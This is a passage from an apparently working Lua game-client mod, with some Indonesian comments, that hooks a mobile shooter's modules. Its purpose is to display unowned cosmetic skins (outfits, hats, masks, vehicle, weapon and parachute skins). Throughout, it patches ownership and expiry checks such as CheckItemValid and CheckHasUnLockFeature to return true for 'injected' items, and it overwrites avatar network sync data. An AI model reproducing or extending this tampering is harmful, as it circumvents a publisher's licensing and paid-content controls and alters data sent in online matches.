            if err_code == 0 or err_code == NET_OK then
                knapsack_vst = F.mergeInjectedIntoVehicleSlotList(knapsack_vst)
            end
            oRsp(err_code, knapsack_vst)
            if err_code == 0 or err_code == NET_OK then
                F.syncVehicleSlotsToDataMgr()
                F.equipVehicleTypesFromConfig(PERSIST.configVehicleSlots)
                if not (_G.AddOutfitLobbyVeh and _G.AddOutfitLobbyVeh.manual) then
                    pcall(F.applyVehicleSkinsToPC)
                end
                F.persistMarkDirty()
            end
        end
    end)
    pcall(function()
        local gsm = ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.golden_suit_module)
        if gsm and gsm.VehicleNeedClothes and not gsm._AddOutfitVehClothesHooked then
            gsm._AddOutfitVehClothesHooked = true
            local o = gsm.VehicleNeedClothes
            gsm.VehicleNeedClothes = function(self, vehicleId)
                vehicleId = tonumber(vehicleId)
                if vehicleId and F.isInjectedRes(vehicleId) then return 0 end
                return o(self, vehicleId)
            end
        end
    end)
    pcall(function()
        local mod = require("GameLua.Activity.Commercialize.GamePlay.CommerAvatarDataUtil")
        if mod._FillVehicleSkinList then
            if not _G.AddOutfitVehFillOrig then
                _G.AddOutfitVehFillOrig = mod._FillVehicleSkinList
            end
            local o = _G.AddOutfitVehFillOrig
            mod._FillVehicleSkinList = function(self, playerInfo, uPlayerController)
                F.mergeVstIntoPlayerInfo(playerInfo)
                return o(self, playerInfo, uPlayerController)
            end
            mod._AddOutfitFillVehHooked = true
        end
    end)
    pcall(function()
        local classMod = require("GameLua.Mod.BaseMod.Client.InGameUI.VehicleControl.VehicleSkinItem")
        if not classMod or not classMod.__inner_impl then return end
        local impl = classMod.__inner_impl
        if not _G.AddOutfitVehOrigClick then
            _G.AddOutfitVehOrigClick = impl.OnClickSkinButton
        end
        local oClick = _G.AddOutfitVehOrigClick
        impl.OnClickSkinButton = function(self)
            local resID = tonumber(self.resID)
            if resID and resID > 0 then
                if F.matchApplyVehicleSkin(resID) then
                    pcall(function()
                        if EVENTYPE_INGAME_VEHICLE_CONTROL_PANEL and EVENTID_CHANGE_VEHICLESKIN_BUTTON_CLICK then
                            EventSystem:postEvent(EVENTYPE_INGAME_VEHICLE_CONTROL_PANEL, EVENTID_CHANGE_VEHICLESKIN_BUTTON_CLICK)
                        end
                    end)
                end
                return
            end
            return oClick(self)
        end
        if not _G.AddOutfitVehOrigRefresh then
            _G.AddOutfitVehOrigRefresh = impl.OnRefresh
        end
        local oRefresh = _G.AddOutfitVehOrigRefresh
        impl.OnRefresh = function(self, resID, selectIndex)
            oRefresh(self, resID, selectIndex)
            if self.resID and tonumber(self.resID) and tonumber(self.resID) > 0 then
                if F.isResourcesReady(self.resID) then
                    pcall(function()
                        local PufferConst = require("client.slua.logic.download.puffer_const")
                        self.dowloadState = PufferConst.ENUM_DownloadState.Done
                        self.UIRoot.Image_Download:SetWidgetVisibility(UEnums.ESlateVisibility.Collapsed)
                        self:SetWidgetVisible(self.UIRoot.Image_Mask, false)
                    end)
                else
                    F.requestResourceDownload(self.resID)
                end
            end
        end
        classMod._AddOutfitSkinClickHooked = true
    end)
    pcall(function()
        local utilMod = require("GameLua.Activity.Commercialize.GamePlay.Vehicle.VehiclePlateLicenseUtil")
        if utilMod.CheckHasUnLockFeature and not utilMod._AddOutfitVehPlateHooked then
            utilMod._AddOutfitVehPlateHooked = true
            local orig = utilMod.CheckHasUnLockFeature
            utilMod.CheckHasUnLockFeature = function(ft, uid, itemId)
                local id = tonumber(itemId)
                if F.isVehicleSkinAllowed(id) or F.isChassisLightId(id) then return true end
                return orig(ft, uid, itemId)
            end
        end
    end)
    pcall(function()
        local panelMod = require("GameLua.Mod.BaseMod.Client.InGameUI.VehicleControl.VehicleSkinAndMusicPanel")
        if panelMod and panelMod.__inner_impl and not panelMod._AddOutfitInitSkinHooked then
            panelMod._AddOutfitInitSkinHooked = true
            local o = panelMod.__inner_impl.InitSkinList
            panelMod.__inner_impl.InitSkinList = function(self)
                F.applyVehicleSkinsToPC(F.getPC())
                return o(self)
            end
        end
    end)
    pcall(function()
        local VUC = require("GameLua.GameCore.Module.Vehicle.Component.VehicleUserComponent")
        if not VUC then return end
        if not _G.AddOutfitVehOrigEnter then
            _G.AddOutfitVehOrigEnter = VUC.SendUIMsgWhenEnterVehicleCompleted
        end
        local oEnter = _G.AddOutfitVehOrigEnter
        VUC.SendUIMsgWhenEnterVehicleCompleted = function(self)
            oEnter(self)
            pcall(function()
                if slua.isValid(self.Vehicle) then
                    F.autoApplyVehicleSkinOnEnter(self.Vehicle)
                end
            end)
        end
        VUC._AddOutfitEnterVehHooked = true
    end)
end

function F.hookWeaponWear()
    pcall(function()
        local HT = require("client.logic.lobby.hall_theme_utils")
        local o = HT.IsWeaponWear
        HT.IsWeaponWear = function(insId)
            insId = tonumber(insId)
            if F.isInjectedIns(insId) then
                local c = F.cache()
                local Arm = require("client.logic.armory.logic_armory")
                for wid, w in pairs(c.weapons) do
                    if tonumber(w.insID) == insId then
                        if Arm.rsp_list and Arm.rsp_list.install_list and Arm.rsp_list.install_list[wid] then
                            return tonumber(Arm.rsp_list.install_list[wid].skin_id) == insId
                        end
                        return true
                    end
                end
            end
            return o(insId)
        end
    end)
end

function F.hookNotice()
    pcall(function()
        if DataMgr and not DataMgr._AddOutfitExpireHooked then
            DataMgr._AddOutfitExpireHooked = true
            local oValid = DataMgr.IsValidTime
            DataMgr.IsValidTime = function(expireTS)
                if expireTS == nil or tonumber(expireTS) == 0 then return true end
                if oValid and oValid(expireTS) then return true end
                local inMatch = false
                pcall(function()
                    inMatch = GameStatus and GameStatus.IsInFightingStatus and GameStatus.IsInFightingStatus()
                end)
                if not inMatch then return true end
                return false
            end
        end
    end)
end

function F.wrapWardrobeClick(classMod, key)
    if not classMod or not classMod[key] or classMod["_AddOutfitWrap_" .. key] then return end
    classMod["_AddOutfitWrap_" .. key] = true
    local orig = classMod[key]
    classMod[key] = function(self, widget, index)
        local itemData = self.LoopScrollGrid_Normal and self.LoopScrollGrid_Normal:GetItemData(index)
        if itemData then
            F.clearItemExpire(itemData, itemData.ins_id, itemData.res_id)
            F.ensureDepotItemValid(itemData.ins_id, itemData.res_id)
        end
        return orig(self, widget, index)
    end
end

function F.hookWardrobeWearClicks()
    if _G.AddOutfitWearClickHooked then return end
    _G.AddOutfitWearClickHooked = true
    F.hookNotice()
    pcall(function()
        local avatarClass = require("client.slua.umg.Wardrobe.subtab_avatar")
        F.wrapWardrobeClick(avatarClass, "OnClickItem")
        F.wrapWardrobeClick(avatarClass, "ClickAvatarItem")
    end)
    pcall(function()
        local suitClass = require("client.slua.umg.Wardrobe.subtab_suit")
        F.wrapWardrobeClick(suitClass, "OnClickItem")
    end)
    pcall(function()
        local bagClass = require("client.slua.umg.Wardrobe.subtab_bag")
        F.wrapWardrobeClick(bagClass, "OnClickItem")
    end)
end

function F.hookAvatarValid()
    pcall(function()
        local path = "GameLua.Mod.Library.GamePlay.Avatar.Component.CharacterAvatarComponent"
        local comp = require(path)
        if comp and comp.CheckItemValid then
            local o = comp.CheckItemValid
            comp.CheckItemValid = function(self, resID)
                if F.isInjectedRes(resID) then return true end
                return o(self, resID)
            end
        end
    end)
end

function F.isInRealMatch()
    local ok, r = pcall(function()
        return GameStatus and GameStatus.IsInFightingStatus and GameStatus.IsInFightingStatus()
    end)
    return ok and r == true
end

function F.getLocalChar()
    local ok, GD = pcall(require, "GameLua.GameCore.Data.GameplayData")
    if not ok or not GD then return nil end
    local char = GD.GetPlayerCharacter()
    if char and slua.isValid(char) then return char end
    return nil
end

function F.getWAC(char)
    local w = char and char.GetCurrentWeapon and char:GetCurrentWeapon()
    if slua.isValid(w) and slua.isValid(w.WeaponAvatarComponent) then
        return w.WeaponAvatarComponent
    end
    return nil
end

function F.notify(msg)
    if not DEBUG then return end
    pcall(function() if ShowNotice then ShowNotice("[AddOutfit] " .. tostring(msg)) end end)
end

function F.getDesiredOutfit()
    if MATCH_CONFIG.outfitRes and MATCH_CONFIG.outfitRes > 0 then
        return MATCH_CONFIG.outfitRes
    end
    local wornSuitRes
    pcall(function()
        local _, res = F.findWornInsBySubType(OUTFIT_SUB, function(r) return F.isSuitRes(r) end)
        wornSuitRes = tonumber(res)
    end)
    if wornSuitRes and wornSuitRes > 0 then return wornSuitRes end
    local tshirtWorn = false
    pcall(function()
        local ins = F.findWornInsBySubType(OUTFIT_SUB, function(r) return F.isTshirtRes(r) end)
        tshirtWorn = ins ~= nil
    end)
    if tshirtWorn then return nil end
    F.syncBodyCacheFromLobby()
    local c = F.cache()
    return c.outfitRes
end

function F.matchApplyOutfit(char)
    local outfitRes = F.getDesiredOutfit()
    if not outfitRes then return true end
    if not F.isResourcesReady(outfitRes) then
        F.requestResourceDownload(outfitRes)
        return false
    end
    local comp = F.getAvatarComp2(char)
    if not comp then return false end
    local ok = F.setMakeSkin(comp, outfitRes, F.CUST_SLOT.ClothesEquipemtSlot, { allowPutOn = true })
    return ok
end

function F.getDesiredHat()
    if MATCH_CONFIG.hatRes and tonumber(MATCH_CONFIG.hatRes) > 0 then
        return tonumber(MATCH_CONFIG.hatRes)
    end
    F.syncHatCacheFromLobby()
    local h = F.cache().hatRes
    if h and tonumber(h) > 0 then return tonumber(h) end
    return tonumber(_G.AddOutfitLastLobbyHatRes) or nil
end

function F.ensureSkinDownload(resID)
    resID = tonumber(resID)
    if not resID or resID <= 0 then return end
    _G.skinIdCache = _G.skinIdCache or {}
    if not _G.skinIdCache[resID] then
        F.requestResourceDownload(resID)
        _G.skinIdCache[resID] = true
    end
end

function F.syncGlobalWearSkins()
    _G.CustSlotType = F.CUST_SLOT
    _G.skinIdCache = _G.skinIdCache or {}
    _G.HatSkin = tonumber(F.getDesiredHat()) or 0
    local outfit = F.getDesiredOutfit()
    _G.SuitSkin = tonumber(outfit)
        or tonumber(F.getDesiredWear("tshirtRes", "tshirtRes", "AddOutfitLastLobbyTshirtRes", F.syncBodyCacheFromLobby))
        or 0
    _G.PantsSkin = tonumber(F.getDesiredWear("pantsRes", "pantsRes", "AddOutfitLastLobbyPantsRes", F.syncBodyCacheFromLobby)) or 0
    _G.ShoesSkin = tonumber(F.getDesiredWear("shoesRes", "shoesRes", "AddOutfitLastLobbyShoesRes", F.syncBodyCacheFromLobby)) or 0
    _G.GlovesSkin = tonumber(F.getDesiredWear("glovesRes", "glovesRes", "AddOutfitLastLobbyGlovesRes", F.syncBodyCacheFromLobby)) or 0
    _G.MaskSkin = tonumber(F.getDesiredMask()) or 0
    _G.GlassSkin = tonumber(F.getDesiredGlass()) or 0
    _G.GliderSkin = tonumber(F.getDesiredGliderRes()) or 0
    _G.ParachuteSkin = tonumber(F.getDesiredParachuteRes()) or 0
end

function F.setMakeSkinAtIndex(comp, applyIdx, resID, slotID)
    resID = tonumber(resID)
    slotID = tonumber(slotID)
    applyIdx = tonumber(applyIdx)
    if not comp or not slua.isValid(comp) or not resID or resID <= 0 or not slotID or applyIdx == nil then
        return false
    end
    local changed = false
    pcall(function()
        local net = comp.NetAvatarData
        if not net then return end
        local applyData = net.SlotSyncData
        if not applyData or not slua.isValid(applyData) then return end
        local equipment = applyData:Get(applyIdx)
        if equipment and equipment.SlotID == slotID then
            local cur = tonumber(equipment.ItemId) or tonumber(equipment.ItemID) or 0
            if cur ~= resID then
                F.ensureSkinDownload(resID)
                equipment.ItemId = resID
                if equipment.ItemID ~= nil then equipment.ItemID = resID end
                applyData:Set(applyIdx, equipment)
                changed = true
            end
        end
    end)
    return changed
end

function F.applySlotSkinBatch(comp, entries, opts)
    opts = opts or {}
    if not comp or not slua.isValid(comp) or not entries then return false end
    local changed, anyOk = false, false
    pcall(function()
        local net = comp.NetAvatarData
        if not net then return end
        local applyData = net.SlotSyncData
        if not applyData or not slua.isValid(applyData) then return end
        local num = applyData:Num()
        for _, e in ipairs(entries) do
            local itemId, slotId = tonumber(e[1]), tonumber(e[2])
            if itemId and itemId > 0 and slotId then
                F.ensureSkinDownload(itemId)
                for i = 0, num - 1 do
                    local equipment = applyData:Get(i)
                    if equipment and equipment.SlotID == slotId then
                        local cur = tonumber(equipment.ItemId) or tonumber(equipment.ItemID) or 0
                        if cur == itemId then
                            anyOk = true
                        elseif cur ~= itemId then
                            equipment.ItemId = itemId
                            if equipment.ItemID ~= nil then equipment.ItemID = itemId end
                            applyData:Set(i, equipment)
                            changed = true
                            anyOk = true
                        end
                        break
                    end
                end
            end
        end
        if (changed or opts.forceRep) and comp.OnRep_BodySlotStateChanged then
            comp:OnRep_BodySlotStateChanged()
        end
    end)
    return anyOk or changed
end

function F.setMakeSkin(comp, resID, slotID, opts)
    opts = opts or {}
    slotID, resID = tonumber(slotID), tonumber(resID)
    if not comp or not slua.isValid(comp) or not slotID or not resID or resID <= 0 then return false end
    local changed = false
    local already = false
    pcall(function()
        local net = comp.NetAvatarData
        if not net then return end
        local applyData = net.SlotSyncData
        if not applyData or not slua.isValid(applyData) then return end
        local num = applyData:Num()
        for i = 0, num - 1 do
            local equipment = applyData:Get(i)
            if equipment and equipment.SlotID == slotID then
                local cur = tonumber(equipment.ItemId) or tonumber(equipment.ItemID) or 0
                if cur == resID then
                    already = true
                elseif cur ~= resID then
                    F.ensureSkinDownload(resID)
                    equipment.ItemId = resID
                    if equipment.ItemID ~= nil then equipment.ItemID = resID end
                    applyData:Set(i, equipment)
                    changed = true
                end
                break
            end
        end
        if changed and not opts.skipRep and comp.OnRep_BodySlotStateChanged then
            comp:OnRep_BodySlotStateChanged()
        end
        if opts.inAir and comp.PutOnCustomEquipmentByID then
            comp:PutOnCustomEquipmentByID(resID)
        end
    end)
    if already or changed then return true end
    if opts.allowPutOn and comp.PutOnCustomEquipmentByID then
        pcall(function() comp:PutOnCustomEquipmentByID(resID) end)
        return true
    end
    return false
end
F.setSlotSkin = F.setMakeSkin

_G.setMakeSkin = function(applyIdx, itemId, applyEquipSlot)
    local char = F.getLocalChar()
    if not char then return end
    local comp = F.getAvatarComp2(char)
    if not comp then return end
    if F.setMakeSkinAtIndex(comp, applyIdx, itemId, applyEquipSlot) then
        pcall(function()
            if comp.OnRep_BodySlotStateChanged then comp:OnRep_BodySlotStateChanged() end
        end)
    end
end

function F.patchWearNetAvatar(comp, resID, slotName, noForceShow)
    if not comp or not slua.isValid(comp) or not resID or resID <= 0 or not slotName then return false end
    local ok = false
    pcall(function()
        local EAvatarSlotType = import("EAvatarSlotType")
        local ESyncOperation = import("ESyncOperation")
        local slot = EAvatarSlotType[slotName]
        if not slot then return end
        local sync = comp.GetSlotSyncData and comp:GetSlotSyncData(slot)
        if sync then
            sync.ItemID = resID
            if sync.FakeItemID ~= nil then sync.FakeItemID = resID end
            sync.OperationType = ESyncOperation.PutOn
            if comp.ChangeSlotSyncData then
                comp:ChangeSlotSyncData(sync)
                ok = true
            end
        end
        if not noForceShow and comp.SetAvatarVisibility then
            comp:SetAvatarVisibility(slot, true, true)
        end
    end)
    return ok
end

function F.patchHatNetAvatar(comp, hatRes)
    return F.patchWearNetAvatar(comp, hatRes, "EAvatarSlotType_HatEquipemtSlot")
end

function F.matchApplyWearItem(char, resID, slotID, label, opts)
    if not resID or resID <= 0 then return true end
    slotID = slotID or F.resToCustSlot(resID)
    if not slotID then return false end
    local comp = F.getAvatarComp2(char)
    if not comp then return false end
    opts = opts or {}
    opts.allowPutOn = true
    local ok = F.setMakeSkin(comp, resID, slotID, opts)
    return ok
end

function F.getDesiredMask()
    if MATCH_CONFIG.maskRes and tonumber(MATCH_CONFIG.maskRes) > 0 then
        return tonumber(MATCH_CONFIG.maskRes)
    end
    F.syncFaceCacheFromLobby()
    local m = F.cache().maskRes
    if m and tonumber(m) > 0 then return tonumber(m) end
    return tonumber(_G.AddOutfitLastLobbyMaskRes) or nil
end

function F.getDesiredGlass()
    if MATCH_CONFIG.glassRes and tonumber(MATCH_CONFIG.glassRes) > 0 then
        return tonumber(MATCH_CONFIG.glassRes)
    end
    F.syncFaceCacheFromLobby()
    local g = F.cache().glassRes
    if g and tonumber(g) > 0 then return tonumber(g) end
    return tonumber(_G.AddOutfitLastLobbyGlassRes) or nil
end

function F.matchApplyFaceWear(char)
    local maskRes = F.getDesiredMask()
    local glassRes = F.getDesiredGlass()
    if (not maskRes or maskRes <= 0) and (not glassRes or glassRes <= 0) then
        return true
    end
    char = char or F.getLocalChar()
    if not char then return false end
    local comp = F.getAvatarComp2(char)
    if not comp then return false end

    local ok = false
    pcall(function()
        local EAvatarSlotType = import("EAvatarSlotType")
        local ESyncOperation = import("ESyncOperation")
        local net = comp.NetAvatarData
        local applyData = net and net.SlotSyncData

        local function forceApplySlot(resID, slotID, slotNameStr)
            if not resID or resID <= 0 then return end
            
            local slotEnum = EAvatarSlotType and EAvatarSlotType[slotNameStr]
            local needRep = false
            
            -- 1. TIMPA DATA JARINGAN (Cegah error sinkronisasi)
            if applyData and slua.isValid(applyData) then
                local found = false
                for i = 0, applyData:Num() - 1 do
                    local equipment = applyData:Get(i)
                    if equipment and equipment.SlotID == slotID then
                        found = true
                        local cur = tonumber(equipment.ItemId) or tonumber(equipment.ItemID) or 0
                        if cur ~= resID then
                            F.ensureSkinDownload(resID)
                            equipment.ItemId = resID
                            if equipment.ItemID ~= nil then equipment.ItemID = resID end
                            if equipment.FakeItemID ~= nil then equipment.FakeItemID = resID end
                            applyData:Set(i, equipment)
                            needRep = true
                        end
                        break
                    end
                end
                
                if not found then
                    F.ensureSkinDownload(resID)
                    local entry = import("AvatarSyncData")()
                    entry.SlotID = slotID
                    entry.ItemId = resID
                    entry.ItemID = resID
                    entry.FakeItemID = resID
                    entry.OperationType = ESyncOperation.PutOn
                    applyData:Add(entry)
                    needRep = true
                end
            end

            -- [LOGIC TIDUR] - OPTIMALISASI FPS ABSOLUT
            _G.FaceWearStateCache = _G.FaceWearStateCache or {}
            -- Buat ID unik untuk karakter saat ini hindari duplikasi
            local cacheKey = tostring(comp) .. "_" .. tostring(slotID)

            if needRep or _G.FaceWearStateCache[cacheKey] ~= resID then
                -- Pertama kali paksa tampil / Atau ID Skin berubah -> Jalankan Full C++
                if slotEnum then
                    if comp.CancelHideAvatarBySlot then comp:CancelHideAvatarBySlot(slotEnum) end
                    if comp.SetAvatarVisibility then comp:SetAvatarVisibility(slotEnum, true, true) end
                end
                if comp.PutOnCustomEquipmentByID then
                    comp:PutOnCustomEquipmentByID(resID)
                end
                
                -- Update Cache agar loop berikutnya masuk ke TIDUR
                _G.FaceWearStateCache[cacheKey] = resID
                ok = true -- Nyalakan flag untuk panggil OnRep_BodySlotStateChanged (render ulang Mesh)
            else
                -- STATUS TIDUR: Data sudah benar, Mesh 3D sudah dirender.
                -- Hanya jalankan fungsi sangat ringan CancelHide untuk cegah Game sembunyikan otomatis saat mengambil Helm (1,2,3).
                -- LEWATI render ulang Mesh untuk hindari Drop FPS.
                if slotEnum and comp.CancelHideAvatarBySlot then 
                    comp:CancelHideAvatarBySlot(slotEnum) 
                end
            end
        end

        -- Panggil perintah paksa untuk Masker (Mask)
        forceApplySlot(maskRes, F.CUST_SLOT.FaceEquipemtSlot, "EAvatarSlotType_FaceEquipemtSlot")
        -- Panggil perintah paksa untuk Kacamata (Glass)
        forceApplySlot(glassRes, F.CUST_SLOT.GlassEquipemtSlot, "EAvatarSlotType_GlassEquipemtSlot")
        
        -- Update gambar 3D HANYA SAAT KELUAR DARI TIDUR (Saat diperlukan)
        if ok and comp.OnRep_BodySlotStateChanged then
            comp:OnRep_BodySlotStateChanged()
        end
    end)
    return ok
end

function F.getDesiredWear(configKey, cacheResKey, globalKey, syncFn)
    local fixed = MATCH_CONFIG[configKey] and tonumber(MATCH_CONFIG[configKey])
    if fixed and fixed > 0 then return fixed end
    local persistKey = cacheResKey and cacheResKey:gsub("Res$", "")
    if persistKey and PERSIST.configSlots then
        local pr = tonumber(PERSIST.configSlots[persistKey])
        if pr and pr > 0 then return pr end
    end
    if syncFn then syncFn() end
    local v = F.cache()[cacheResKey]
    if v and tonumber(v) > 0 then return tonumber(v) end
    return tonumber(_G[globalKey]) or nil
end

local EQUIP_APPLY = { lastBagWrite = 0, lastHelmetWrite = 0 }

function F.levelSkinID(baseSkin, level)
    level = tonumber(level) or 1
    if level < 1 then level = 1 end
    local mapped = 0
    pcall(function()
        local t = CDataTable.GetTableData("BackpackMapping", baseSkin)
        if t then
            if level <= 1 then mapped = tonumber(t.SkinItemIDLv1) or 0
            elseif level == 2 then mapped = tonumber(t.SkinItemIDLv2) or 0
            else mapped = tonumber(t.SkinItemIDLv3) or 0 end
        end
    end)
    if mapped > 0 then return mapped end
    return baseSkin + (level - 1) * 1000
end

function F.applyEquipSkinToComp(comp, bagRes, helmetRes)
    local applied, found = false, false
    pcall(function()
        local EAvatarSlotType = import("EAvatarSlotType")
        local BackpackUtils = import("BackpackUtils")
        local function doSlot(slotEnum, res, levelFn, lastKey)
            res = tonumber(res) or 0
            if res <= 0 or not slotEnum then return end
            local sync = comp.GetSlotSyncData and comp:GetSlotSyncData(slotEnum)
            if not sync then return end
            local cur = tonumber(sync.ItemID) or 0
            local addID = tonumber(sync.AdditionalItemID) or 0
            if cur <= 0 and addID <= 0 then return end
            found = true
            local lvl = 1
            pcall(function()
                if levelFn then lvl = levelFn(addID > 0 and addID or cur) or 1 end
            end)
            if lvl < 1 then lvl = 1 end
            local target = F.levelSkinID(res, lvl)
            if target > 0 and cur ~= target then
                sync.ItemID = target
                comp:ChangeSlotSyncData(sync)
                applied = true
                EQUIP_APPLY[lastKey] = target
            end
        end
        doSlot(EAvatarSlotType.EAvatarSlotType_BackpackEquipemtSlot, bagRes,
               BackpackUtils.GetEquipmentBagLevel, "lastBagWrite")
        doSlot(EAvatarSlotType.EAvatarSlotType_HelmetEquipemtSlot, helmetRes,
               BackpackUtils.GetEquipmentHelmetLevel, "lastHelmetWrite")
    end)
    return applied, found
end

function F.matchApplyEquipmentSkin(char, bagRes, helmetRes)
    bagRes = tonumber(bagRes) or 0
    helmetRes = tonumber(helmetRes) or 0
    if bagRes <= 0 and helmetRes <= 0 then return true end
    local comp = char.CharacterAvatarComp2_BP
    if not slua.isValid(comp) then return false end

    local applied, found = F.applyEquipSkinToComp(comp, bagRes, helmetRes)

    if applied then
        pcall(function()
            if comp.OnRep_BodySlotStateChanged then comp:OnRep_BodySlotStateChanged() end
        end)
        return true
    end
    return found
end

function F.hookEquipmentRectify()
    _G.AddOutfitEquipRectifyFn = function(self)
        pcall(function()
            if self.IsLobbyActor and self:IsLobbyActor() then return end
            if not (self.IsSelf and self:IsSelf()) then return end
            local bagRes = F.getDesiredWear("bagRes", "bagRes", "AddOutfitLastLobbyBagRes", F.syncBodyCacheFromLobby)
            local helmetRes = F.getDesiredWear("helmetRes", "helmetRes", "AddOutfitLastLobbyHelmetRes", F.syncBodyCacheFromLobby)
            if (tonumber(bagRes) or 0) <= 0 and (tonumber(helmetRes) or 0) <= 0 then return end
            F.applyEquipSkinToComp(self, bagRes, helmetRes)
        end)
    end
    pcall(function()
        local MCAC = require("GameLua.Mod.TPlan.Component.MetroCharacterAvatarComponent")
        if MCAC._AddOutfitRectifyHooked then return end
        MCAC._AddOutfitRectifyHooked = true
        local o = MCAC.ProcessClientAvatarRectify
        MCAC.ProcessClientAvatarRectify = function(self)
            o(self)
            if _G.AddOutfitEquipRectifyFn then _G.AddOutfitEquipRectifyFn(self) end
        end
    end)
end

function F.applyAirborneSlots(char, forceInAir)
    local comp = F.getAvatarComp2(char)
    if not comp or not slua.isValid(comp) then return false end
    pcall(function() F.syncAirborneToDataMgr() end)
    local inAir = forceInAir == true or F.isCharacterAirborne(char)
    local any = false
    local paraRes = F.getDesiredParachuteRes()
    if paraRes and paraRes > 0 then
        any = true
        if not F.isResourcesReady(paraRes) then F.requestResourceDownload(paraRes) end
        F.setMakeSkin(comp, paraRes, F.CUST_SLOT.ParachuteEquipemtSlot, { inAir = inAir })
    end
    local gliderRes = F.getDesiredGliderRes()
    if gliderRes and gliderRes > 0 then
        any = true
        if not F.isResourcesReady(gliderRes) then F.requestResourceDownload(gliderRes) end
        F.setMakeSkin(comp, gliderRes, F.CUST_SLOT.GlideEquipemtSlot, { inAir = inAir })
    end
    return any
end

function F.matchApplyBodyWear(char)
    local pieces = {}
    if not F.getDesiredOutfit() then
        pieces[#pieces + 1] = {
            F.getDesiredWear("tshirtRes", "tshirtRes", "AddOutfitLastLobbyTshirtRes", F.syncBodyCacheFromLobby),
            F.CUST_SLOT.ClothesEquipemtSlot, "Baju",
        }
    end
    pieces[#pieces + 1] = { F.getDesiredWear("pantsRes", "pantsRes", "AddOutfitLastLobbyPantsRes", F.syncBodyCacheFromLobby), F.CUST_SLOT.PantsEquipemtSlot, "Celana" }
    pieces[#pieces + 1] = { F.getDesiredWear("shoesRes", "shoesRes", "AddOutfitLastLobbyShoesRes", F.syncBodyCacheFromLobby), F.CUST_SLOT.ShoesEquipemtSlot, "Sepatu" }
    pieces[#pieces + 1] = { F.getDesiredWear("glovesRes", "glovesRes", "AddOutfitLastLobbyGlovesRes", F.syncBodyCacheFromLobby), F.CUST_SLOT.HandEffectEquipemtSlot, "Sarung Tangan" }
    local any, okAll = false, true
    for _, p in ipairs(pieces) do
        local res, slot, label = p[1], p[2], p[3]
        if res and res > 0 then
            any = true
            okAll = F.matchApplyWearItem(char, res, slot, label) and okAll
        end
    end
    local anyAir = F.applyAirborneSlots(char, false)
    if anyAir then any = true end
    local bagRes = F.getDesiredWear("bagRes", "bagRes", "AddOutfitLastLobbyBagRes", F.syncBodyCacheFromLobby)
    local helmetRes = F.getDesiredWear("helmetRes", "helmetRes", "AddOutfitLastLobbyHelmetRes", F.syncBodyCacheFromLobby)
    if (tonumber(bagRes) or 0) > 0 or (tonumber(helmetRes) or 0) > 0 then
        any = true
        okAll = F.matchApplyEquipmentSkin(char, bagRes, helmetRes) and okAll
    end
    return not any or okAll
end

function F.matchApplyAllSlots(char)
    if not char then return false end
    F.syncGlobalWearSkins()
    local comp = F.getAvatarComp2(char)
    if not comp then return false end

    local entries = {}
    local function add(skin, slot)
        skin = tonumber(skin)
        if skin and skin > 0 and slot then entries[#entries + 1] = { skin, slot } end
    end
    add(_G.HatSkin, F.CUST_SLOT.HatEquipemtSlot)
    add(_G.SuitSkin, F.CUST_SLOT.ClothesEquipemtSlot)
    add(_G.PantsSkin, F.CUST_SLOT.PantsEquipemtSlot)
    add(_G.ShoesSkin, F.CUST_SLOT.ShoesEquipemtSlot)
    add(_G.GlovesSkin, F.CUST_SLOT.HandEffectEquipemtSlot)
    add(_G.MaskSkin, F.CUST_SLOT.FaceEquipemtSlot)
    add(_G.GlassSkin, F.CUST_SLOT.GlassEquipemtSlot)

    local ok = false
    if #entries > 0 then
        ok = F.applySlotSkinBatch(comp, entries, { forceRep = true })
        if not ok then
            for _, e in ipairs(entries) do
                if F.setMakeSkin(comp, e[1], e[2], { allowPutOn = true }) then ok = true end
            end
        end
    end

    F.applyAirborneSlots(char, false)

    local bagRes = F.getDesiredWear("bagRes", "bagRes", "AddOutfitLastLobbyBagRes", F.syncBodyCacheFromLobby)
    local helmetRes = F.getDesiredWear("helmetRes", "helmetRes", "AddOutfitLastLobbyHelmetRes", F.syncBodyCacheFromLobby)
    if (tonumber(bagRes) or 0) > 0 or (tonumber(helmetRes) or 0) > 0 then
        ok = F.matchApplyEquipmentSkin(char, bagRes, helmetRes) or ok
    end

    return ok or #entries == 0
end

function F.matchApplyHat(char)
    local hatRes = tonumber(F.getDesiredHat())
    if not hatRes or hatRes <= 0 then return true end
    char = char or F.getLocalChar()
    if not char then return false end
    local comp = F.getAvatarComp2(char)
    if not comp then return false end
    local slotID = F.CUST_SLOT.HatEquipemtSlot
    local ok = false
    pcall(function()
        local net = comp.NetAvatarData
        if not net then return end
        local applyData = net.SlotSyncData
        if not applyData or not slua.isValid(applyData) then return end
        local found = false
        for i = 0, applyData:Num() - 1 do
            local equipment = applyData:Get(i)
            if equipment and equipment.SlotID == slotID then
                found = true
                local cur = tonumber(equipment.ItemId) or tonumber(equipment.ItemID) or 0
                if cur ~= hatRes then
                    F.ensureSkinDownload(hatRes)
                    equipment.ItemId = hatRes
                    if equipment.ItemID ~= nil then equipment.ItemID = hatRes end
                    if equipment.FakeItemID ~= nil then equipment.FakeItemID = hatRes end
                    applyData:Set(i, equipment)
                end
                ok = true
                break
            end
        end
        if not found then
            F.ensureSkinDownload(hatRes)
            local ESyncOperation = import("ESyncOperation")
            local entry = import("AvatarSyncData")()
            entry.SlotID = slotID
            entry.ItemId = hatRes
            entry.ItemID = hatRes
            entry.FakeItemID = hatRes
            entry.OperationType = ESyncOperation.PutOn
            applyData:Add(entry)
            ok = true
        end
        
    end)
    return ok
end

local _avatarItemsRegistered = false

function F.getDesiredWeaponSkins()
    if PERF.desiredSkins then return PERF.desiredSkins end
    F.syncWeaponCacheFromLobby()
    local out, seen = {}, {}
    local function add(res)
        res = tonumber(res)
        if res and res > 0 and not seen[res] then seen[res] = true; out[#out+1] = res end
    end
    for wid, w in pairs(F.cache().weapons) do
        if wid ~= MELEE_ID and w.resID then add(w.resID) end
    end
    if MATCH_CONFIG.weaponSkins then
        for _, res in pairs(MATCH_CONFIG.weaponSkins) do add(res) end
    end
    PERF.desiredSkins = out
    return out
end

function F._cacheSkinTarget(weaponResID, skin)
    if skin and skin > 0 then PERF.skinTarget[weaponResID] = skin else PERF.skinTarget[weaponResID] = 0 end
    return skin
end

local GUN_MASTER_SYN_SLOT = 7

function F.findSkinSlotInSynData(weapon)
    if not slua.isValid(weapon) then return GUN_MASTER_SYN_SLOT, 0 end
    local arr = weapon.synData
    if not arr or not slua.isValid(arr) then return GUN_MASTER_SYN_SLOT, 0 end
    local count = 0
    pcall(function() count = arr:Num() end)
